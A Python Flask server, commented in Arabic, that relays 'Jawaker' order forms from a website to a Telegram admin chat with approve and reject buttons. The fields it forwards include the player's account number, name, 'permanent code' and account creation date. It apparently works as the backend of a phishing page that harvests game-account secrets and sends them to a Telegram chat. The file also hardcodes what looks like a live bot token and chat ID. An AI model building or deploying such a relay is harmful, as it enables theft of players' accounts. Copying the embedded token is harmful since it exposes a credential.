"""
سيرفر جواكر - الوسيط بين الموقع وبوت التلجرام
------------------------------------------------
الوظيفة:
1. يستقبل بيانات الفورم من الموقع (POST /api/order)
2. يبعتها للأدمن عبر تلجرام مع زرين: تأكيد / رفض
3. يستقبل ضغطة الزر من تلجرام (POST /telegram/webhook)
4. يحدّث حالة الطلب، والموقع بيسأل عنها (GET /api/order/<id>) لحد ما توصل نتيجة

تشغيل محلي:
    pip install -r requirements.txt
    python app.py

بعد النشر (Render/Railway/إلخ)، لازم تربط الويبهوك:
    curl -X POST https://api.telegram.org/bot<TOKEN>/setWebhook \
         -d "url=https://YOUR-SERVER-URL/telegram/webhook"
"""

import os
import time
import uuid
import threading

import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

# ------------------ الإعدادات ------------------
BOT_TOKEN = "8941591490:AAE_HP_z4z7Ls0nEsalTqLI1dYsg4TYdOL4"
ADMIN_CHAT_ID = 5437487652
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

app = Flask(__name__)
CORS(app)  # يسمح لموقعك (من أي دومين) يحكي مع هاد السيرفر

# تخزين مؤقت بالذاكرة. ⚠️ لو السيرفر بعمل restart، الطلبات المعلّقة بتضيع.
# لاستخدام حقيقي/دائم، بدّليها بقاعدة بيانات (SQLite/Postgres).
orders = {}
orders_lock = threading.Lock()


def build_admin_message(order_id: str, payload: dict) -> str:
    order_info = payload.get("order", {})
    return (
        "طلب دفع جديد 🟢\n"
        f"رقم الطلب: {order_id}\n"
        f"الفئة: {order_info.get('name', '-')}\n"
        f"الكمية: {order_info.get('amount', '-')}\n"
        f"السعر: {order_info.get('price', '-')}\n\n"
        f"ID: {payload.get('id', '-')}\n"
        f"رقم جواكر: {payload.get('jawakerNumber', '-')}\n"
        f"اسم جواكر: {payload.get('jawakerName', '-')}\n"
        f"الرمز الدائم: {payload.get('permCode', '-')}\n"
        f"تاريخ إنشاء الحساب: {payload.get('accountDate', '-')}"
    )


@app.route("/api/order", methods=["POST"])
def create_order():
    payload = request.get_json(force=True)
    order_id = str(uuid.uuid4())[:8]

    with orders_lock:
        orders[order_id] = {"status": "pending", "created_at": time.time()}

    text = build_admin_message(order_id, payload)
    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ تأكيد", "callback_data": f"approve:{order_id}"},
            {"text": "❌ رفض", "callback_data": f"reject:{order_id}"},
        ]]
    }

    try:
        requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": ADMIN_CHAT_ID,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=10,
        )
    except requests.RequestException as e:
        return jsonify({"error": f"telegram_send_failed: {e}"}), 502

    return jsonify({"order_id": order_id})


@app.route("/api/order/<order_id>", methods=["GET"])
def get_order_status(order_id):
    order = orders.get(order_id)
    if not order:
        return jsonify({"error": "not_found"}), 404
    return jsonify({"status": order["status"]})


@app.route("/telegram/webhook", methods=["POST"])
def telegram_webhook():
    update = request.get_json(force=True)
    callback = update.get("callback_query")
    if not callback:
        return jsonify({"ok": True})

    data = callback.get("data", "")
    callback_id = callback["id"]
    message = callback.get("message", {})
    chat_id = message.get("chat", {}).get("id")
    message_id = message.get("message_id")
    old_text = message.get("text", "")

    if ":" not in data:
        return jsonify({"ok": True})

    action, order_id = data.split(":", 1)

    with orders_lock:
        order = orders.get(order_id)
        if order and order["status"] == "pending":
            if action == "approve":
                order["status"] = "approved"
                note = "\n\n✅ تم التأكيد"
            elif action == "reject":
                order["status"] = "rejected"
                note = "\n\n❌ تم الرفض"
            else:
                note = None
        else:
            note = None

    # رد فوري على تلجرام (حتى تختفي دائرة التحميل عن الزر)
    requests.post(
        f"{TELEGRAM_API}/answerCallbackQuery",
        json={"callback_query_id": callback_id, "text": "تم تسجيل قرارك"},
        timeout=10,
    )

    if note and chat_id and message_id:
        requests.post(
            f"{TELEGRAM_API}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": old_text + note,
            },
            timeout=10,
        )

    return jsonify({"ok": True})


@app.route("/", methods=["GET"])
def health():
    return jsonify({"status": "running"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
